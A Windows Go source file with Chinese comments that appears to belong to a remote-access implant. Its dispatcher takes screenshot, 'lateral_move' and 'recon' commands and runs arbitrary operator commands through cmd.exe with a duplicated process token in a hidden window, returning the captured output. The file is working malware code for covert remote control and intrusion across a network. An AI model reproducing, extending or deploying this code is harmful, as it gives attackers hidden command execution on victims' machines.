//go:build windows
// +build windows

package commands

import (
	"bytes"
	"fmt"
	"io"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

var (
	advapi32            = syscall.NewLazyDLL("advapi32.dll")
	createProcessAsUser = advapi32.NewProc("CreateProcessAsUserW")
)

// ExecuteWithPrivilege 使用当前进程令牌执行命令
func ExecuteWithPrivilege(cmdStr string) string {
	cmdStr = strings.TrimSpace(cmdStr)

	// 检查特殊命令
	if cmdStr == "screenshot" {
		return TakeScreenshot()
	}
	if strings.HasPrefix(cmdStr, "lateral_move:") {
		jsonData := strings.TrimPrefix(cmdStr, "lateral_move:")
		return ExecuteLateralMove(jsonData)
	}
	if strings.HasPrefix(cmdStr, "recon:") {
		jsonData := strings.TrimPrefix(cmdStr, "recon:")
		return ExecuteRecon(jsonData)
	}

	// 获取当前进程令牌
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &token)
	if err != nil {
		// 如果无法获取令牌，降级到普通执行
		return executeNormal(cmdStr)
	}
	defer token.Close()

	// 复制令牌为主令牌（用于创建进程）
	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(
		token,
		windows.MAXIMUM_ALLOWED,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&primaryToken,
	)
	if err != nil {
		return executeNormal(cmdStr)
	}
	defer primaryToken.Close()

	// 使用令牌创建进程执行命令
	output, err := createProcessWithToken(primaryToken, cmdStr)
	if err != nil {
		return fmt.Sprintf("命令执行失败: %v", err)
	}

	// 处理中文编码
	utf8Output, err := gbkToUtf8(output)
	if err != nil {
		utf8Output = string(output)
	}

	return utf8Output
}

// createProcessWithToken 使用指定令牌创建进程
func createProcessWithToken(token windows.Token, cmdStr string) ([]byte, error) {
	// 构造完整命令行
	fullCmd := fmt.Sprintf("cmd.exe /C %s", cmdStr)
	cmdLine, err := windows.UTF16PtrFromString(fullCmd)
	if err != nil {
		return nil, err
	}

	// 创建管道用于捕获输出
	var stdoutRead, stdoutWrite windows.Handle
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle:      1,
		SecurityDescriptor: nil,
	}

	err = windows.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0)
	if err != nil {
		return nil, fmt.Errorf("failed to create pipe: %v", err)
	}
	defer windows.CloseHandle(stdoutRead)
	defer windows.CloseHandle(stdoutWrite)

	// 设置启动信息
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE
	si.StdOutput = stdoutWrite
	si.StdErr = stdoutWrite

	var pi windows.ProcessInformation

	// 使用令牌创建进程
	ret, _, err := createProcessAsUser.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0,
		0,
		1, // bInheritHandles = true
		windows.CREATE_NO_WINDOW,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CreateProcessAsUser failed: %v", err)
	}

	// 关闭写入端，以便读取
	windows.CloseHandle(stdoutWrite)

	// 等待进程完成
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)

	// 读取输出
	var output []byte
	buf := make([]byte, 4096)
	for {
		var bytesRead uint32
		err := windows.ReadFile(stdoutRead, buf, &bytesRead, nil)
		if err != nil || bytesRead == 0 {
			break
		}
		output = append(output, buf[:bytesRead]...)
	}

	windows.CloseHandle(pi.Process)
	windows.CloseHandle(pi.Thread)

	return output, nil
}

// executeNormal 普通方式执行命令（降级方案）
func executeNormal(cmdStr string) string {
	cmd := exec.Command("cmd", "/C", cmdStr)
	output, _ := cmd.CombinedOutput()

	utf8Output, err := gbkToUtf8(output)
	if err != nil {
		utf8Output = string(output)
	}

	return utf8Output
}

// gbkToUtf8 将 GBK 编码转换为 UTF-8
func gbkToUtf8(s []byte) (string, error) {
	reader := transform.NewReader(bytes.NewReader(s), simplifiedchinese.GBK.NewDecoder())
	d, err := io.ReadAll(reader)
	if err != nil {
		return "", err
	}
	return string(d), nil
}
